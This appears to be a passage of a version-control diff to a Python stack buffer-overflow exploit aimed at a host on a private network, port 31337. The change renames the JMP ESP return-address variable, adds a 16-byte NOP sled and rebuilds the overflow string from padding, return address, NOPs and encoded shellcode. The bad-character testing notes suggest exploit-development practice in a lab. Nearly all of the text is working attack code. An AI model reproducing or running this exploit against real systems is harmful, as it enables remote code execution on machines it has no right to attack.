@@ -3,7 +3,8 @@ import socket,sys
 from time import sleep
 ip="192.168.1.59"
 port=31337
-addr="\xC3\x14\x04\x08" #JMP ESP adress in littleendian format
+esp ="\xC3\x14\x04\x08" #JMP ESP adress in littleendian format
+nops = "\x90"*16
 
 #badchar_test = "" 			#start with empty string
 #badchars = [0x00, 0x0A]			#every time bad...
@@ -32,8 +33,7 @@ shellcode += b"\xcf\xa8\x38\x61\x25\xee\x44\xe2\xcc\x8e\xb2"
 shellcode += b"\xfa\xa4\x8b\xff\xbc\x55\xe1\x90\x28\x5a\x56"
 shellcode += b"\x90\x78\x39\x39\x02\xe0\x90\xdc\xa2\x83\xec"
 
-
-bof = "A"*146+addr+"x90"*16+shellcode
+bof = "A"*146 + esp + nops + shellcode
 #shellcode length can be 844
 #badchar = x00x0a
 try:
